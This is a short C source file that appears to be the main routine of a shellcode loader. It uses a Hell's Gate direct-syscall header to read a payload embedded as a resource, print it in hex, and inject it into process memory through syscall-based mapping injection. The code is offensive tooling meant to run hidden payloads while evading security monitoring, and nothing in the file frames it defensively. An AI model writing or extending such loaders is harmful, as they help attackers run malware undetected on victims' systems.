#include "HellsGate.h"
#include "Common.h"

int main() {
	PVOID pPayloadAddress = NULL;
	SIZE_T sPayloadSize = 0;

	if (ReadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
		printf("[!] Failed To Read Payload From The Resource\n");
		return -1;
	}
	printf("[+] Read Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);

	PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);

	InitializeSyscalls();
	RemoteMappingInjectionViaSyscalls(
		GetCurrentProcessHandle(),
		pPayloadAddress,
		sPayloadSize,
		TRUE
	);

	return 0;
}